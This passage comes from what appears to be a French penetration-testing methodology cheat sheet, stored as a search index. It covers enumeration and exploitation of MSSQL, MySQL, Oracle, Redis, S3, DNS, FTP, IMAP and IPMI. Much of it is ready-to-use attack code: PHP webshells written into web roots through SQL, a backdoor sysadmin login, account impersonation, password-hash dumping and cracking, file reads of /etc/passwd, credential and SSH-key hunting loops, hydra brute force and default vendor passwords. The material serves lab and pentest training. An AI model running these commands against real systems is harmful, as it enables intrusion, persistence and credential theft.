'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#lecture-dun-fichier","title":"Lecture d'un fichier","text":"<pre><code>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#creation-de-compte","title":"Cr\u00e9ation de compte","text":"<pre><code>------------------------------------------------------------------------\n-- Create user with sysadmin privs\nCREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';\nEXEC sp_addsrvrolemember 'hacker', 'sysadmin';\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#user-impersonate","title":"User Impersonate","text":"<p>Si l'\u00e9num\u00e9ration pr\u00e9sent\u00e9e plus haut nous liste des utilisateurs que l'on peut \"impersonate\" (usurper l'identit\u00e9), on peut alors utiliser les commandes suivantes :</p> <pre><code>-- Exploitation\nuser master; -- db sur laquelle on est sur d'avoir les droits\nEXECUTE AS LOGIN = 'sa';\nSELECT SYSTEM_USER;\nSELECT IS_SRVROLEMEMBER('sysadmin');\nREVERT; -- retourne aux droits pr\u00e9c\u00e9dents\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#linked-server","title":"Linked Server","text":"<p>Si on a un serveur li\u00e9 (voir \u00e9num\u00e9ration sur cette page), on peut ex\u00e9cuter des requ\u00eates \u00e0 distance sur cette machine :</p> <pre><code>EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]\n</code></pre> <p>There are other methods to get command execution, such as adding\u00a0extended stored procedures,\u00a0CLR Assemblies,\u00a0SQL Server Agent Jobs, and\u00a0external scripts. However, besides those methods there are also additional functionalities that can be used like the\u00a0<code>xp_regwrite</code>\u00a0command that is used to elevate privileges by creating new entries in the Windows registry.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#pillage-collecte-de-hash","title":"Pillage : collecte de hash","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#client-mssql","title":"Client MSSql","text":"<p>Les hash des comptes utilisateurs peuvent \u00eatre extraits via :</p> <pre><code>select name,password_hash from sys.sql_logins ;\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#nmap_1","title":"Nmap","text":"<pre><code>nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#powerupsql","title":"PowerUpSQL","text":"<pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLServerPasswordHash -username sa -Password Password@1 -instance WIN-P83OS778EQK\\SQLEXPRESS -Verbose\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#cassage-des-hash","title":"Cassage des hash","text":"<pre><code>john --format=mssql12 --wordlist=pass hash\n\nhashcat -m 1731 hash pass.list # TODO : confirme the syntax\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#voir-aussi","title":"Voir aussi","text":"<p>https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MSSQL%20%28SQL%20Server%29/#references","title":"R\u00e9f\u00e9rences","text":"<ul> <li>https://www.hackingarticles.in/mssql-for-pentester-hashing/</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MongoDB/","title":"MongoDB","text":"<p>Port par d\u00e9faut : 27017, 27018, 27019, 27020</p> <p>Commandes :</p> <pre><code>$ mongo\n\n&gt; show dbs\n&gt; use &lt;db&gt;\n&gt; show collections\n&gt; db.&lt;collection&gt;.find().forEach(printjson); #Dump the collection\n&gt; db.&lt;collection&gt;.count() #Number of records of the collection\n&gt; db.current.find({\"username\":\"admin\"}) #Find in current db the username admin\n&gt; db.&lt;collection&gt;.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")}, {$set:{\"attributeXXX\":\"valueXXX\"}})'\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/","title":"MySQL MariaDB","text":"<p>Port : 3306</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/#enumeration","title":"Enumeration","text":"<pre><code>sudo nmap $TARGET_IP -sV -sC -p3306 --script \"mysql-*\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/#connexion","title":"Connexion","text":"<pre><code># Connexion en tant qu'utilisateur 'root'\n\n#    - Sans mot de passe\nmysql -h $TARGET_IP -u root  -P 3306\n\n#    - Avec mot de passe\nmysql -h $TARGET_IP -u root  -pLeMotDePasseSansEspace -P 3306\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/#commandes-utiles","title":"Commandes utiles","text":"<pre><code>-- Voir les privil\u00e8ges dont on dispose\nshow grants; \n\nselect version();\n\nshow databases;\n\nuse &lt;database&gt;;\n\nshow tables;\nshow columns from &lt;table&gt;;\nselect * from &lt;table&gt; where &lt;column&gt; = \"&lt;texte&gt;\";\nselect * from &lt;table&gt; where &lt;column&gt; like \"&lt;debut du texte&gt;%\";\n\n\n-- Consultation de la valeur de secure_file_priv\n-- selon sa valeur, l'\u00e9crite dans un fichier via INTO OUTFILE sera possible ou non\n-- si VIDE : on peut l'utiliser. si pointe vers un dossier, seul ce dossier est autoris\u00e9 en export. Si NULL : d\u00e9sactiv\u00e9\n show variables like \"secure_file_priv\";\n-- Ecriture d'un webshell \nmysql&gt; SELECT \"&lt;?php echo shell_exec($_GET['c']);?&gt;\" INTO OUTFILE '/var/www/html/webshell.php';\n\n\n-- dump des hash de la DB\nSELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !=''\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/#exploitation","title":"Exploitation","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/MySQL-MariaDB/#lecture-dun-fichier","title":"Lecture d'un fichier","text":"<pre><code>-- Ne fonctionne pas sur une in stallation par d\u00e9faut\nselect LOAD_FILE(\"/etc/passwd\");\nselect TO_BASE64(LOAD_FILE(\"/etc/passwd\"));\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/","title":"Oracle TNS","text":"<p>Ports :</p> <ul> <li>1521/tcp</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#installation-de-loutil-denumeration","title":"Installation de l'outil d'\u00e9num\u00e9ration","text":"<p>-sid-brute</p> <pre><code>#!/bin/bash\n\nsudo apt-get install libaio1 python3-dev alien python3-pip -y\ngit clone https://github.com/quentinhardy/odat.git\ncd odat/\ngit submodule init\nsudo submodule update\nsudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap\nsudo pip3 install argcomplete &amp;&amp; sudo activate-global-python-argcomplete\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#nmap-sid-bruteforcing","title":"nmap - SID Bruteforcing","text":"<pre><code>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#odatpy","title":"odat.py","text":"<pre><code>./odat.py all -s 10.129.204.235\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#sqlplus-log-in","title":"SQLplus - Log In","text":"<pre><code>export ORACLE_HOME=/usr/lib/oracle/19.6/client64\nexport LD_LIBRARY_PATH=\"$ORACLE_HOME/lib\"\nexport PATH=\"$ORACLE_HOME:$PATH\"\n\n$ sqlplus &lt;user&gt;/&lt;password@\"$TARGET_IP\"/&lt;DB_SID&gt;\n\nsqlplus &lt;user&gt;/&lt;password@\"$TARGET_IP\"/&lt;DB_SID&gt; as SYSDBA  &lt;==\n</code></pre> <p>If you come across the following error <code>sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory</code>, please execute the below, taken from here.</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#commandes-utiles","title":"Commandes utiles","text":"<pre><code>SQL&gt; select table_name from all_tables;\nSQL&gt; select * from user_role_privs;\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#oracle-rdbms-extract-password-hashes","title":"Oracle RDBMS - Extract Password Hashes","text":"<pre><code>SQL&gt; select name, password from sys.user$;\n\nNAME                           PASSWORD\n------------------------------ ------------------------------\nSYS                            FBA343E7D6C8BC9D\nPUBLIC\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Oracle%20TNS/#oracle-rdbms-file-upload","title":"Oracle RDBMS - File Upload","text":"<p>Si la vuln\u00e9rabilit\u00e9 est exploitable et que le serveur h\u00e9berge un serveur web dont on arrive \u00e0 trouver le chemin d'acc\u00e8s \u00e0 la racine, on peut tenter cela :</p> <pre><code>$ echo \"Oracle File Upload Test\" &gt; testing.txt\n$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt\n\n[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\\inetpub\\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  \n[...]\n</code></pre> <p>Valider l'upload</p> <pre><code>curl -X GET http://10.129.204.235/testing.txt\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/PostgreSQL/","title":"PostgreSQL","text":"<pre><code>psql -h localhost -U &lt;UTILISATEUR&gt; -d &lt;DB&gt;\n\n# quitter \n\\q\n\n# lister les db\n\\l\n\n# se connecter \u00e0 une db\n\\c &lt;DB&gt;\n\n# lister les tables\n\\dt\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/Redis/","title":"Redis","text":"<p>Port par d\u00e9faut : 6379</p> <p>Commandes utiles</p> <pre><code>redis-cli -h &lt;HOSTNAME&gt;\n\n# afficher toutes les informations (version, etc)\n&gt; INFO\n\n# afficher les information sur le serveur uniquement \n&gt; INFO server\n\n# Liste des DB\n&gt; CONFIG GET databases\n\n# Info sur les cl\u00e9 des diff\u00e9rentes DB\n&gt; INFO keyspace\n# Keyspace\ndb0:keys=4,expires=0,avg_ttl=0\n\n# Lister toutes les cl\u00e9s \n&gt; KEYS *\n1) \"flag\"\n2) \"stor\"\n3) \"numb\"\n4) \"temp\"\n\n# R\u00e9cup\u00e9rer la valeur d'une cl\u00e9\n&gt; GET flag\n\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Bases%20de%20donn%C3%A9es/S3/","title":"S3","text":"<p>Port HTTP</p> <p>Outil : <code>aws</code></p> <pre><code># configuration n\u00e9cessaire m\u00eame s'il n'y a pas d'api \n$ aws configure\nAWS Access Key ID [None]: temp\nAWS Secret Access Key [None]: temp\nDefault region name [None]: temp\nDefault output format [None]: temp\n\n# enumeration (ls)\n$ aws --endpoint=http://s3.thetoppers.htb s3 ls\n2023-04-16 16:59:26 thetoppers.htb\n\n# enumeration d'un sous dossier (ls)\n$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb\n                           PRE images/\n2023-04-16 16:59:26          0 .htaccess\n2023-04-16 16:59:26      11952 index.php\n\n# upload d'un fichier\n$ aws --endpoint=http://s3.thetoppers.htb s3 cp s.php s3://thetoppers.htb\nupload: ./s.php to s3://thetoppers.htb/s.php   \n\n# commandes valides : \nls                                       | website                                 \ncp                                       | mv                                      \nrm                                       | sync                                    \nmb                                       | rb    \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Linux/Locale/Fichiers/","title":"Fichiers","text":"<pre><code># Setuid files\nfind / -perm -4000 -ls 2&gt;/dev/null\n###############\n# Credential Hunting \nfor l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n\n## Credentials in Configuration Files\nfor i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done\n\n## Databases\nfor l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done\n\n## Notes\nfind /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"\n\n## Scripts\nfor l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done\n\n## logs\nfor i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done\n\n\n\n###########\n# Potential SSH keys\ngrep -rnw \"PRIVATE KEY\" /* 2&gt;/dev/null | grep \":1\"\n\nfor p in $(ls / | grep -vE '^(bin|boot|dev|lib|lib32|lib64|libx32|proc|sys|usr)$');do echo \"Searching for SSH keys in /$p\"; grep -rnw \"PRIVATE KEY\" /$p 2&gt;/dev/null | grep \":1\";done\n\n# interesting files\nfor ext in $(echo \".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*\");do echo -e \"\\nFile extension: \" $ext; find / -name *$ext 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Linux/Locale/Fichiers/#_1","title":"Fichiers","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/","title":"DNS","text":"<p>Ports :  53 (tcp/udp)</p> <p>Le port TCP/53 est utilis\u00e9 dans les transferts de zone</p> <p>Popular types of DNS attacks : https://securitytrails.com/blog/most-popular-types-dns-attacks</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#enumeration","title":"Enumeration","text":"<pre><code>nmap -p53 -Pn -sV -sC $TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#version","title":"Version","text":"<p>En plus de l'\u00e9num\u00e9ration classique nmap ou l'usage du script NSE dns-id, on peut parfois utiliser dig</p> <pre><code>dig CH TXT version.bind $TARGET\n</code></pre> <p>ou <code>host</code></p> <pre><code>host -c CH -t TXT version.bind $TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#liste-des-serveurs-dns-dune-zone","title":"Liste des serveurs DNS d'une Zone","text":"<pre><code># r\u00e9cup\u00e8re la liste des nameserver depuis le serveur DNS $TARGET_IP\ndig ns $DOMAIN @$TARGET\nnslookup -query=NS $DOMAIN $TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#liste-des-enregistrements-disponibles","title":"Liste des enregistrements disponibles","text":"<pre><code>dig any $DOMAIN @$TARGET\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#attaques-exploitations","title":"Attaques / Exploitations","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#transfert-de-zone","title":"Transfert de zone","text":"<pre><code>dig axfr $DOMAIN @$TARGET | tee axfr_$DOMAIN\n# create hostlist\ncat axfr_$DOMAIN | grep -v ';' | tr \"\\t\" \" \" | cut -d ' ' -f1 | sed 's/\\.$//g' | tee found_axfr_subdomains.txt\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#bruteforce-des-sous-domaines","title":"Bruteforce des sous domaines","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#manuelle","title":"Manuelle","text":"<pre><code>for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.$DOMAIN @$TARGET | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#dnsenum","title":"dnsenum","text":"<pre><code># Google scrapping d\u00e9sactiv\u00e9 (-s 0 -p 0)\ndnsenum --dnsserver $TARGET --enum -p 0 -s 0 -o /workspace/Scans/Service/DNS-SUBDOMAINS-$DOMAIN.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt $DOMAIN\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#gobuster","title":"gobuster","text":"<p>Bruteforce classique</p> <pre><code>dns -q -c -i -d \"$DOMAIN\" -w \"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\" --resolver $TARGET \n</code></pre> <p>Bruteforce des sous domaines selon un motif (pattern) sp\u00e9cifique</p> <p>```title=\"patterns.txt\" lert-api-shv-{GOBUSTER}-sin6 atlas-pp-shv-{GOBUSTER}-sin6</p> <pre><code>```shell title=\"ex\u00e9cution de gobuster\"\nexport TARGET=\"facebook.com\"\nexport NS=\"d.ns.facebook.com\"\nexport WORDLIST=\"numbers.txt\"\ngobuster dns -q -r \"${NS}\" -d \"${TARGET}\" -w \"${WORDLIST}\" -p ./patterns.txt -o \"gobuster_${TARGET}.txt\"\n\nFound: lert-api-shv-01-sin6.facebook.com\nFound: atlas-pp-shv-01-sin6.facebook.com\nFound: atlas-pp-shv-02-sin6.facebook.com\nFound: atlas-pp-shv-03-sin6.facebook.com\nFound: lert-api-shv-03-sin6.facebook.com\n[...]\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#fierce","title":"fierce","text":"<pre><code>fierce --domain $DOMAIN --dns-servers $TARGET_IP --subdomain-file names.txt \n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#subfinder","title":"subfinder","text":"<pre><code># https://github.com/projectdiscovery/subfinder\n./subfinder -d inlanefreight.com -v   \n</code></pre> <p>https://github.com/aboul3la/Sublist3r</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#subbrute","title":"subbrute","text":"<p>On peut utiliser subbrute pour trouver des sous domaines qui pourront ensuite resservir \u00e0 trouver d'autres sous domaines.</p> <p>Au lancement, subbrute essaie de faire une requ\u00eate <code>ANY</code>. Si elle ne fonctionne pas, on obtiens une message : <code>Warning: No nameservers found, trying fallback list.</code></p> <p>Dans ce cas, on peut passer au domaine suivant.</p> <pre><code># https://github.com/TheRook/subbrute\necho \"rebrec.local\" &gt; ./resolvers.txt\n./subbrute.py -s ../names.txt  $DOMAIN -r ../resolvers.txt -P\nWarning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.\nrebrec.local,SOA,ns1.rebrec.local. root.rebrec.local. 3 86400 3600 604800 3600\nrebrec.local,NS,ns1.rebrec.local.\nns1.rebrec.local,A,127.0.0.1\nwww.rebrec.local,A,172.24.0.3\nwww1.rebrec.local,TXT,\"Some Text !\"\nwww2.rebrec.local,CNAME,www.rebrec.local.\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/DNS/#decouverte-de-sous-domaines","title":"D\u00e9couverte de sous domaines","text":"<p>Lorsqu'on cherche des sous domaines, on constate que le serveur DNS retourne des messages d'erreur diff\u00e9rents selon si le domaine existe ou non.</p> <p>Exemple avec un serveur DNS g\u00e9rant la zone <code>inlanefreight.htb</code></p> <pre><code> host -t any aaa.inlanefreight.htb $TARGET_IP \nUsing domain server:\nName: 10.129.243.143\nAddress: 10.129.243.143#53\nAliases: \n\nHost aaa.inlanefreight.htb not found: 3(NXDOMAIN)\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/FTP/","title":"FTP","text":"<p>Ports par d\u00e9faut : 21, 20</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/FTP/#methodes-de-connexion","title":"M\u00e9thodes de connexion","text":"<pre><code>$ nc -nv $TARGET_IP 21\n$ telnet $TARGET_IP 21\n$ openssl s_client -connect \"$TARGET_IP\":21 -starttls ftp\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/FTP/#commandes-utiles","title":"Commandes utiles","text":"<pre><code>ftp&gt; status\n\n\nConnected to 10.129.14.136.\nNo proxy connection.\nConnecting using address family: any.\nMode: stream; Type: binary; Form: non-print; Structure: file\nVerbose: on; Bell: off; Prompting: on; Globbing: on\nStore unique: off; Receive unique: off\nCase: off; CR stripping: on\nQuote control characters: on\nNtrans: off\nNmap: off\nHash mark printing: off; Use of PORT cmds: on\nTick counter printing: off\n</code></pre> <pre><code>ftp&gt; debug\nDebugging on (debug=1).\n\nftp&gt; trace\nPacket tracing on.\n\nftp&gt; ls\n---&gt; PORT 10,10,14,4,188,195\n200 PORT command successful. Consider using PASV.\n---&gt; LIST\n150 Here comes the directory listing.\n-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/FTP/#telecharger-un-dossier-entier","title":"T\u00e9l\u00e9charger un dossier entier","text":"<pre><code>wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/FTP/#brute-force-avec-hydra","title":"Brute force avec hydra","text":"<pre><code> hydra  -l ceil -P rockyou.txt ftp://$TARGET_IP:2121 -t 48\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/","title":"IMAP et POP3","text":"<p>Ports :</p> <ul> <li>110 (POP3)</li> <li>143 (IMAP avec ou sans TLS)</li> <li>993 (IMAP (avec TLS)</li> <li>995 (POP3 avec TLS)</li> </ul>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#via-nmap","title":"Via NMAP","text":"<pre><code>sudo nmap $TARGET -sV -p110,143,993,995 -sC\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#via-curl","title":"Via cURL","text":"<pre><code>curl -k \"imaps://$TARGET_IP\" --user user:password -v\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#via-openssl","title":"Via OpenSSL","text":"<pre><code># POP3 over TLS\nopenssl s_client -connect $TARGET_IP:pop3s\n\n# IMAP over TLS\nopenssl s_client -connect $TARGET_IP:imaps\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#commandes-imap","title":"Commandes IMAP","text":"<p>Tutoriel : https://nickb.dev/blog/introduction-to-imap/</p> <p>ATTENTION : certain client IMAP semble n'accepter que des commandes qui se terminent par <code>\\r\\n</code>. L'utilitaire  <code>nc</code> n'envoie qu'un <code>\\n</code>. Mais on peut utiliser <code>ncat --crlf $TARGET_IP 143</code> qui enverra des sauts de ligne de type <code>\\r\\n</code></p> <pre><code>$ rlwrap -g LOGIN openssl s_client -connect $TARGET_IP:imaps -quiet -crlf\n\n\n# Authentification\n1 LOGIN username password\n\n# Liste des bo\u00eetes aux lettres\n1 LIST * * \n\n# S\u00e9lection d'une bo\u00eete aux lettres :\n1 SELECT DEV.DEPARTMENT.INT\n1 SELECT INBOX\n\n# Recherche des messages pr\u00e9sents :\n1 UID SEARCH ALL\n* SEARCH 1          &lt;==== on a 1 mail dont l'UID est '1'\n\n# Lecture d'un message dont on connait l'UID (1 ici)\n#  (PEEK permet de ne pas marquer le message comme Lu)\n1 FETCH 1 BODY.PEEK[HEADER]  &lt;== affiche l'ent\u00eate smtp\n1 FETCH 1 BODY.PEEK[TEXT]    &lt;== affiche le corps du mail\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#exploitation","title":"Exploitation","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#enumeration-dutilisateurs","title":"Enum\u00e9ration d'utilisateurs","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#automatisee","title":"Automatis\u00e9e","text":"<p>[[Enum\u00e9ration d'utilisateurs \u00e0 distance via la messagerie]]</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IMAP%20et%20POP3/#manuelle","title":"Manuelle","text":"<pre><code>telnet $TARGET_IP 110\n[...]\nUSER baduser1\n\n-ERR\n\n\nUSER existinguser\n\n+OK\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/","title":"IPMI","text":"<p>Port : 623/udp</p>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#enumeration","title":"Enumeration","text":""},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#nmap","title":"nmap","text":"<pre><code>$ sudo nmap -sU --script ipmi-version -p 623 $TARGET_IP\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#metasploit","title":"metasploit","text":"<pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version \nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options \n\nModule options (auxiliary/scanner/ipmi/ipmi_version):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to probe in each set\n   RHOSTS     10.129.42.195    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT      623              yes       The target port (UDP)\n   THREADS    10               yes       The number of concurrent threads\n\n\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run\n\n[*] Sending IPMI requests to 10.129.42.195-&gt;10.129.42.195 (1 hosts)\n[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) \n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n</code></pre>"},{"location":"_M%C3%A9thodologie/1-Enum%C3%A9ration/Services/IPMI/#default-passwords","title":"Default passwords","text":"Product Username Password Dell iDRAC root calvin HP iLO Administrator randomized 8 characters (number and uppercase letters) Supermicro IPMI ADMIN 